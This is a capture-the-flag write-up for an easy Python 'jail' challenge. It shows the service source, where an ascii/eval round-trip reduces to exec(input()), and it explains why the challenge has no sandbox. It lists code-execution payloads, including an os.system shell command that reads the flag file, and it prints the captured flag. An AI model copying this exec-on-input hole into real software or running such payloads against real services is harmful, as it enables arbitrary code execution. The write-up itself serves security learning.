<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=PYSEMJAIL" alt="Typing SVG" /></a>

</div>

# Pysemjail — JAIL · 🟢 EASY

- **Status:** ✅ SOLVED — the service prints its own source, pre-opens the flag file, and `exec`s your input with no filter.
- **Points:** 184 (final dynamic value)
- **Flag:** `IDP{3x3cut4_qu4lqu3R_c01s4__48Pg2qj8QH}`
- **Target:** `nc <HOST> <PORT>` (ephemeral container, 15 min TTL)
- **Prompt:** *"Não eram nem pra estar nessa categoria, mas não tem outra."*

---

## TL;DR

1. The service prints its full source on connect. It opens `flag.txt` into a global `f`, then loops reading input.
2. `exec(eval(ascii(input())))` looks like a filter but is a no-op: `ascii→eval` round-trips the string unchanged, so it reduces to `exec(input())` — arbitrary Python, no sandbox.
3. One line reads the flag: `print(f.read())` (or `print(open('flag.txt').read())`).

## Analysis

The banner is the program itself (`getsource(getmodule(currentframe()))`):

```python
from inspect import getsource, getmodule, currentframe
print(getsource(getmodule(currentframe())))

f = open('flag.txt', 'r')          # flag handle sits in globals

while True:
    try:
        comando = ascii(input('>>> '))
        exec(eval(comando))
    except Exception as e:
        print(e)
```

### Why the `ascii → eval → exec` chain is not a jail

The name says it: *Py-sem-jail* = "Python **sem** (without) jail".

- `input()` returns the raw line you typed, `X`.
- `ascii(X)` returns the **repr** of that string — `X` quoted, with any non-ASCII escaped (`"'print(f.read())'"`).
- `eval(<that repr>)` evaluates the Python string literal and rebuilds the original string `X`. The escaping is reversed on the way back, so it is a perfect round-trip (even accented bytes survive).
- `exec(X)` runs `X` as plain Python.

Net effect: `exec(input())`. No blocklist, no `__builtins__` stripping, no AST check. The only "obstacle" is cosmetic.

### Solve

At the `>>>` prompt, a single line:

```python
print(open('flag.txt').read())
```

→ `IDP{3x3cut4_qu4lqu3R_c01s4__48Pg2qj8QH}`

The pre-opened global `f` also works directly: `print(f.read())`.

## Conclusion

A deliberate fake jail — the description ("weren't even supposed to be in this category") flags that there is nothing to escape. Flag text *executa qualquer coisa* ("executes anything") confirms the joke. Solved by inspection; no tooling needed.

---

## Appendix — payloads

- `print(f.read())` — read the already-open handle.
- `print(open('flag.txt').read())` — reopen and read (used for the capture).
- `__import__('os').system('cat flag.txt')` — also works, since there is no filter at all.
